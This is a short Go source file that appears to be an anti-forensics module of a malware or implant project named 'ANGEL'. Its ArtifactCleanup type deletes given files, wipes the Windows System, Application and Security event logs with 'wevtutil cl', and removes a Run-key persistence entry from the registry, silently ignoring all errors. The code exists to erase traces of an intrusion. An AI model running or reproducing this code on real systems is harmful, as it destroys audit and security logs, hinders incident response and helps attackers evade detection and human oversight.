package cleanup

import (
"os"
"os/exec"
)

type ArtifactCleanup struct {
Paths []string
}

func NewArtifactCleanup(paths []string) *ArtifactCleanup {
return &ArtifactCleanup{Paths: paths}
}

func (a *ArtifactCleanup) Cleanup() bool {
for _, path := range a.Paths {
err := os.Remove(path)
if err != nil {
continue
}
}
return true
}

func (a *ArtifactCleanup) CleanupLogs() bool {
exec.Command("cmd", "/c", "wevtutil cl System").Run()
exec.Command("cmd", "/c", "wevtutil cl Application").Run()
exec.Command("cmd", "/c", "wevtutil cl Security").Run()
return true
}

func (a *ArtifactCleanup) CleanupRegistry() bool {
exec.Command("cmd", "/c", "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ANGEL /f").Run()
return true
}

func (a *ArtifactCleanup) CleanupAll() bool {
a.Cleanup()
a.CleanupLogs()
a.CleanupRegistry()
return true
}

func (a *ArtifactCleanup) GetPaths() []string {
return a.Paths
}
